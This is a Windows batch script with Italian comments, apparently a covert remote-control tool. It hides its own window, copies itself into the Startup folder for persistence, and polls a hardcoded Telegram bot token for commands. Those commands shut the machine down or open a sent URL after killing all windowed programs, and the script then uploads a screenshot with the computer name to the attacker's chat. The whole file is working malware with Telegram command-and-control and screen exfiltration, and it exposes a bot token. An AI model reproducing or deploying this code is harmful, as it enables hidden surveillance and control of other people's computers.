@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "URL_FILE=%TEMP%\last_url.txt"
set "EXECUTED_URLS=%TEMP%\executed_urls.txt"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
:: Controlla nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" > "%TEMP%\updates.json"

:: Estrai comandi dai messaggi
for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text){Write-Output ($_.message.text)}}}"') do (
    set "message=%%A"
    
    if /i "!message!"=="chiudi" (
        :: Spegni il computer
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🛑 Spegnimento computer %COMPUTERNAME% in corso..."
        shutdown /s /t 30 /c "Spegnimento richiesto da Telegram"
        exit
    )
    
    if "!message!" neq "!last_message!" (
        set "last_message=!message!"
        
        if "!message!"=="chiudo" (
            :: Spegni il computer (alternativa)
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                -d "chat_id=%CHAT_ID%" ^
                -d "text=🛑 Spegnimento computer %COMPUTERNAME% in corso..."
            shutdown /s /t 30 /c "Spegnimento richiesto da Telegram"
            exit
        ) else if "!message!"=="" (
            :: Ignora messaggi vuoti
        ) else if "!message!"=="apri" (
            :: Apri l'ultimo URL ricevuto
            if exist "%URL_FILE%" (
                set /p last_url=<"%URL_FILE%"
                if not "!last_url!"=="" (
                    call :open_url "!last_url!"
                )
            )
        ) else (
            :: Verifica se è un URL
            echo "!message!" | findstr /r /c:"^http://" /c:"^https://" >nul && (
                echo !message! > "%URL_FILE%"
                call :open_url "!message!"
            )
        )
    )
)

:: Attesa prima di controllare nuovi comandi
timeout /t 5 /nobreak >nul
goto command_loop

:open_url
    set "url_to_open=%~1"
    
    :: Verifica se l'URL è già stato eseguito
    if exist "%EXECUTED_URLS%" (
        find /i "!url_to_open!" < "%EXECUTED_URLS%" >nul && (
            goto :eof
        )
    )
    
    :: Aggiungi URL alla lista degli eseguiti
    echo !url_to_open! >> "%EXECUTED_URLS%"
    
    :: Chiudi TUTTE le applicazioni con finestre
    powershell -command "Get-Process | Where-Object { $_.MainWindowTitle -ne '' -and $_.ProcessName -ne 'explorer' -and $_.ProcessName -ne 'System' } | ForEach-Object { $_.CloseMainWindow() | Out-Null; Start-Sleep -Milliseconds 200; if (!$_.HasExited) { $_.Kill() } }"
    
    :: Apri nuovo URL
    start "" "!url_to_open!"
    
    :: Attesa caricamento pagina
    timeout /t 10 /nobreak >nul
    
    :: Cattura screenshot
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
    
    :: Invia screenshot
    if exist "%SCREENSHOT_PATH%" (
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
            -F chat_id=%CHAT_ID% ^
            -F photo=@"%SCREENSHOT_PATH%" ^
            -F caption="🖥️ %COMPUTERNAME%: Aperto URL !url_to_open!"
        del "%SCREENSHOT_PATH%" >nul
    )
goto :eof
